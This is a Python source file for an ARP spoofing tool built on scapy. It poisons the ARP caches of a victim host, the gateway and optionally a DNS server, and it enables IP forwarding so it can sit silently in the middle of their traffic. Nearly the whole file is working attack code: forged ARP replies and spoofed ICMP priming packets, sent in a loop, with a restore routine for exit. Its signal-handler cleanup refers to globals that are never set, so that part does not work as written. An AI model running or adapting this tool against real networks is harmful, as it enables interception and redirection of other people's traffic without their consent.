import sys
import signal
import time
import scapy.all as scapy
import os
import argparse
import socket
import struct

def enable_ip_forwarding():
    """Enable IP forwarding to maintain victim connectivity."""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            if f.read().strip() == "1":
                return
    except:
        pass

    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception as e:
        print(f"[!] WARNING: Could not enable IP forwarding: {e}")

def get_mac(ip):
    """Resolve MAC address for given IP using ARP."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # srp returns two lists: answered and unanswered packets
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    if answered_list:
        # return the source MAC address from the first response
        return answered_list[0][1].hwsrc
    return None

def get_default_gateway():
    """Detect default gateway IP address."""
    print("Attempting to detect default gateway...")
    
    # method 1: Scapy
    try:
        # Scapy's conf.route.route("0.0.0.0") returns (interface, output_ip, gateway_ip)
        gws = scapy.conf.route.route("0.0.0.0")
        if gws and gws[2] != '0.0.0.0':
            print(f"SUCCESS: Scapy detected gateway: {gws[2]}")
            return gws[2]
    except Exception as e:
        print(f"WARNING: Scapy detection failed: {e}")
    
    # method 2: read /proc/net/route (the Linux standard)
    print("Trying /proc/net/route...")
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines():
                parts = line.strip().split()
                if len(parts) > 2:
                    destination = parts[1]
                    gateway = parts[2]
                    flags = parts[3]
                    
                    # destination 00000000 is default route
                    # flags: 1 (Route is up) + 2 (Gateway) = 3 (or more)
                    if destination == '00000000' and (int(flags, 16) & 2):
                        # convert hex gateway to IP
                        gw_int = int(gateway, 16)
                        gw_ip = socket.inet_ntoa(struct.pack("<L", gw_int))
                        print(f"SUCCESS: /proc/net/route detected gateway: {gw_ip}")
                        return gw_ip
    except Exception as e:
        print(f"WARNING: /proc/net/route failed: {e}")
        pass
        
    return None

def prime_arp_cache(target_ip, gateway_ip):
    """
    Sends a packet to the target spoofing the gateway to force an ARP entry creation.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        return

    # construct a Ping packet appearing to come from the Gateway
    packet = scapy.Ether(dst=target_mac) / \
             scapy.IP(src=gateway_ip, dst=target_ip) / \
             scapy.ICMP()
             
    scapy.sendp(packet, verbose=False, count=1)

def spoof(target_ip, spoof_ip):
    """
    Sends a spoofed ARP packet to the target.
    Tells the target that the spoof_ip has MY mac address.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        # if we can't resolve the MAC address, we can't spoof
        return
    
    # create ethernet frame with destination MAC address
    ether = scapy.Ether(dst=target_mac)
    # create ARP reply (op=2)
    # pdst = packet destination (target IP)
    # hwdst = hardware destination (target MAC address)
    # psrc = packet source (The IP we are pretending to be)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # send at Layer 2 to ensure correct ethernet destination
    packet = ether / arp
    scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the ARP table of the destination_ip to the correct state.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        # send a legitimate ARP reply with the correct MAC address
        ether = scapy.Ether(dst=destination_mac)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.sendp(ether/packet, count=4, verbose=False)

def run_arp_spoof(target_ip, gateway_ip, dns_ip=None):
    try:
        enable_ip_forwarding()
        targets = f"{target_ip} <-> {gateway_ip}"
        if dns_ip:
            targets += f" + DNS({dns_ip})"
        print(f"[ARP] Poisoning: {targets}")
        
        # prime the ARP cache of the victim and gateway
        prime_arp_cache(target_ip, gateway_ip)
        prime_arp_cache(gateway_ip, target_ip)
        # if a DNS server IP is specified, prime that mapping too
        if dns_ip:
            prime_arp_cache(target_ip, dns_ip)
        
        while True:
            # tell the target that I am the gateway
            spoof(target_ip, gateway_ip)
            # tell the gateway that I am the target
            spoof(gateway_ip, target_ip)
            # if dns_ip is present, spoof the target so it believes the DNS server's IP maps to us
            if dns_ip:
                spoof(target_ip, dns_ip)
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[ARP] Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        if dns_ip:
            restore(target_ip, dns_ip)


def cleanup_and_exit(signum, frame):
    # cleanup: restore poisoned ARP entries
    try:
        if 'target_ip' in globals() and 'gateway_ip' in globals():
            restore(globals()['target_ip'], globals()['gateway_ip'])
            restore(globals()['gateway_ip'], globals()['target_ip'])
        if 'dns_ip' in globals() and globals().get('dns_ip'):
            restore(globals()['target_ip'], globals()['dns_ip'])
    except Exception:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup_and_exit)
signal.signal(signal.SIGTERM, cleanup_and_exit)

def setupArpSpoof(target, gateway, dns_ip=None):
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("target", help="The IP address of the target victim")
    parser.add_argument("gateway", nargs="?", help="The IP address of the gateway (optional, auto-detected if omitted)")
    parser.add_argument("--dns", "-d", help="Optional DNS server IP to also spoof on the victim")
    
    args = parser.parse_args()
    
    target_ip = target
    gateway_ip = gateway
    dns_ip = dns_ip
    
    if not gateway_ip:
        print("Gateway IP not provided. Attempting to auto-detect...")
        gateway_ip = get_default_gateway()
        if not gateway_ip:
            print("WARNING: Could not detect default gateway. Please provide it manually.")
            sys.exit(1)
        print(f"Detected Gateway: {gateway_ip}")
    
    print(f"Running ARP Spoofer...")
    run_arp_spoof(target_ip, gateway_ip, dns_ip)
